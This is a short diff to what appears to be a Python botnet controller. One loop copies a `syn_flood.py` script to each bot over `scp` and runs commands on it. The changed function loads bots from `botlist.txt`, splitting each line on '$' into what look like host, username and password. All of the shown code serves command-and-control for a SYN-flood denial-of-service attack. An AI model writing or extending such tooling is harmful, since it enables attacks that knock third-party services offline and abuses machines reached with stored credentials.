@@ -7,12 +7,13 @@ class Command:
             client.send_command("scp syn_flood.py $HOME/")
             output = client.send_command(command)
             print('[*] Output from ' + client.host)
-            print('[+] ' +str(output, encoding='utf-8')+ '\n')
+            print('[+] ' + str(output, encoding='utf-8') + '\n')
 
     def addClient():
-        botNet = RW.readBot()
-        listBot=[]
-        for bot in botNet:
-            client = Client(bot[0], bot[1], bot[2])
+        f = open("botlist.txt", "r")
+        listBot = []
+        for i in f.readlines():
+            result = i.split("$")
+            client = Client(result[0], result[1], result[2])
             listBot.append(client)
         return listBot
